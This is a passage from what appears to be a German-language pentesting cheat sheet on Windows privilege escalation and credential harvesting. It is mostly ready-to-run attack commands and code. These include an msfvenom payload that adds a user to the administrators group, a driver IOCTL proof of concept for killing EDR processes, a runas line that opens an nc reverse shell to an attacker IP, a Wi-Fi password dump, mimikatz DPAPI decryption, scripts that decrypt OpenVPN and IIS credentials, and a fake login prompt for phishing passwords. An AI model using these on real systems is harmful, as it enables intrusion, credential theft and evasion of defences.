### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Teilkette vor einem Leerzeichen auszuführen.

Zum Beispiel, für den Pfad _C:\Program Files\Some Folder\Service.exe_ wird Windows versuchen, auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle ungequoteten Service-Pfade auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**You can detect and exploit** diese Schwachstelle mit metasploit: `exploit/windows/local/trusted\_service\_path` Man kann manuell ein service binary mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows erlaubt es Benutzern, Aktionen anzugeben, die ausgeführt werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary zeigt. Wenn dieses binary ersetzbar ist, könnte Privilege Escalation möglich sein. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Überprüfe die **permissions der binaries** (vielleicht kannst du eines überschreiben und dadurch escalate privileges) sowie die **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine spezielle Datei zu lesen, oder ob du ein binary ändern kannst, das von einem Administrator-Konto (schedtasks) ausgeführt wird.

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL in seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable/Kopie-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start zu automatischer Codeausführung innerhalb von `notepad++.exe` (einschließlich aus `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du eine Registry- oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Standorte zur Privilegieneskalation** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **Third-party, fehlerhaften/vulnerablen** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein arbitrary kernel read/write primitive bereitstellt (häufig in schlecht entworfenen IOCTL-Handlern), kann man eskalieren, indem man ein SYSTEM token direkt aus dem Kernel-Speicher stiehlt. Siehe die Schritt‑für‑Schritt‑Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Für race-condition bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann das absichtliche Verlangsamen des Lookups (durch Verwendung von max-length components oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf Dutzende von Mikrosekunden strecken:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive‑Schwachstellen erlauben es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU‑Descendants zu missbrauchen und Metadatenkorruption in kernel paged-pool overflows umzuwandeln, ohne einen eigenen Treiber. Erlerne die gesamte Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Einige signierte Drittanbieter‑Treiber erstellen ihr device object mit einem starken SDDL via IoCreateDeviceSecure, vergessen jedoch, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Gerät über einen Pfad geöffnet wird, der eine zusätzliche Komponente enthält, wodurch jeder nicht‑privilegierte Benutzer einen handle erhalten kann, indem er einen namespace path wie folgt benutzt:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Sobald ein Benutzer das Gerät öffnen kann, können die vom Treiber exponierten privilegierten IOCTLs für LPE und tampering missbraucht werden. Beispiele für in the wild beobachtete Fähigkeiten:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setzen Sie immer FILE_DEVICE_SECURE_OPEN, wenn Sie Geräteobjekte erstellen, die durch eine DACL eingeschränkt werden sollen.
- Validieren Sie den Aufruferkontext für privilegierte Operationen. Fügen Sie PP/PPL-Prüfungen hinzu, bevor Sie Prozessbeendigung oder die Rückgabe von Handles zulassen.
- Begrenzen Sie IOCTLs (access masks, METHOD_*, Eingabevalidierung) und erwägen Sie vermittelte Modelle anstelle direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwachen Sie User-Mode-Öffnungen verdächtiger Device-Namen (z. B., \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts vulnerable driver blocklist (HVCI/WDAC/Smart App Control) durch und pflegen Sie eigene Allow/Deny-Listen.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen darüber, wie man diesen check ausnutzen kann:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### Hosts-Datei

Überprüfe die Hosts-Datei auf andere bekannte Computer, die dort fest eingetragen sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Auf **eingeschränkte Dienste** von außen prüfen
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, ausschalten, ausschalten...)**

Mehr[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` befindet sich auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Wenn du Root-Rechte erhältst, kannst du an jedem Port lauschen (das erste Mal, wenn du `nc.exe` verwendest, um an einem Port zu lauschen, wird per GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, versuchen Sie `--default-user root`

Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows** Benutzer **automatisch anmelden** kann. Auf den ersten Blick sieht es so aus, als könnten Nutzer hier ihre Facebook-, Twitter- oder Gmail-Zugangsdaten usw. speichern, damit sie sich automatisch über Browser anmelden. Das ist jedoch nicht der Fall.

Windows Vault speichert Anmeldeinformationen, mit denen sich Windows automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen zum Zugriff auf eine Ressource** (Server oder Website) **den Credential Manager** & Windows Vault nutzen und die gespeicherten Zugangsdaten verwenden kann, anstatt dass Benutzer ständig Benutzernamen und Passwort eingeben müssen.

Solange sich Anwendungen nicht mit dem Credential Manager austauschen, ist es meiner Meinung nach nicht möglich, dass sie die Zugangsdaten für eine bestimmte Ressource verwenden. Wenn Ihre Anwendung also den Vault verwenden möchte, muss sie in irgendeiner Weise **mit dem credential manager kommunizieren und die Zugangsdaten für diese Ressource anfordern** aus dem standardmäßigen Speicher-Vault.

Verwenden Sie `cmdkey`, um die auf dem Rechner gespeicherten Anmeldeinformationen aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Im folgenden Beispiel wird eine entfernte Binärdatei über eine SMB-Freigabe aufgerufen.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit bereitgestellten Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass Tools wie mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### DPAPI

Die Data Protection API (DPAPI) bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die überwiegend im Windows-Betriebssystem für die symmetrische Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das erheblich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet sie die domänenbasierten Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel, die DPAPI verwenden, werden im Verzeichnis %APPDATA%\Microsoft\Protect\{SID} gespeichert, wobei {SID} den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Key, der die privaten Schlüssel des Benutzers in derselben Datei schützt, abgelegt ist**, besteht typischerweise aus 64 Bytes Zufallsdaten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist — ein Auflisten seines Inhalts über den `dir`-Befehl in CMD ist nicht möglich, obwohl es über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Du kannst das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Du kannst **viele DPAPI** **masterkeys** aus **dem Speicher** mit dem `sekurlsa::dpapi` module extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind mit **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer, auf dem sie erstellt wurden, entschlüsselt werden können.

Um eine PowerShell-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Anmeldeinformationsverwaltung**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwende das **Mimikatz** `dpapi::rdg`-Modul mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\  
Du kannst **viele DPAPI masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi`-Modul extrahieren

### Sticky Notes

Viele verwenden die StickyNotes-App auf Windows-Arbeitsplätzen, um passwords und andere Informationen zu speichern, ohne zu erkennen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachte, dass zum Wiederherstellen von passwords aus AppCmd.exe Administrator-Rechte benötigt werden und die Ausführung auf einem High Integrity level erfolgen muss.**\  
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\  
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installer werden **run with SYSTEM privileges** ausgeführt, viele sind anfällig für **DLL Sideloading (Informationen von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registrierungsdatenbank (Anmeldeinformationen)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in der Registry

SSH private keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH key. Dieser ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten automatisch startet, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als ob diese Technik nicht mehr gültig ist. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich via ssh an einer Maschine einzuloggen. Der Registrierungseintrag HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM Sicherungen
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### Zwischengespeichertes GPP-Passwort

Eine Funktion war früher verfügbar, mit der benutzerdefinierte lokale Administratoraccounts auf einer Gruppe von Rechnern über Group Policy Preferences (GPP) bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer eingesehen werden. Zweitens konnten die in diesen GPPs enthaltenen Passwörter, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt sind, von jedem authentifizierten Benutzer entschlüsselt werden. Das stellte ein ernstes Risiko dar, da dadurch Benutzer erhöhte Rechte erlangen konnten.

Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein nicht leeres "cpassword"-Feld enthalten. Sobald eine solche Datei gefunden wird, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zur GPP und zum Speicherort der Datei und hilft so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldeinformationen:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach credentials fragen

Sie können den Benutzer immer **bitten, seine credentials einzugeben oder sogar die credentials eines anderen Benutzers**, wenn Sie denken, dass er sie kennen könnte (beachten Sie, dass das direkte **Fragen** des Clients nach den **credentials** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **passwords** im **clear-text** oder in **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
